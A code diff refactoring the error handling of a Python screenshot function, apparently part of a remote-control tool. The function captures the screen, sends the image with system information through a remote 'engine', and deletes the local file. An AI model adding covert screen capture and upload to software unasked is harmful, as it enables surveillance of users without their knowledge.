@@ -26,12 +26,20 @@ def screenshot(request: Request) -> str:
             # Save the image to the file object as a PNG
             screenshot.save(file, "PNG")
 
-    except: # for error "X connection failed: error 5" when screenshot by root user!
-        pass
+        res = request.engine.send_file(file_name, additionalـinfo=request.system_info(minimal=True))
+        if res:
+            return None
+        return "send screen-shot failed!, engine.send_file error"
 
-    res = request.engine.send_file(file_name, additionalـinfo=request.system_info(minimal=True))
-    os.remove(file_name)
+    except OSError as e:
+        return f"""screenshot - os error: {e}
 
-    if res:
-        return None
-    return "send screen-shot failed!"
+        (error "X connection failed: error 5" it means os does not have any display for this user session.)"""
+
+    except Exception as e:
+        return f"get screen-shot failed: {e}"
+        
+    finally:
+        if os.path.isfile(file_name):
+            os.remove(file_name)
+
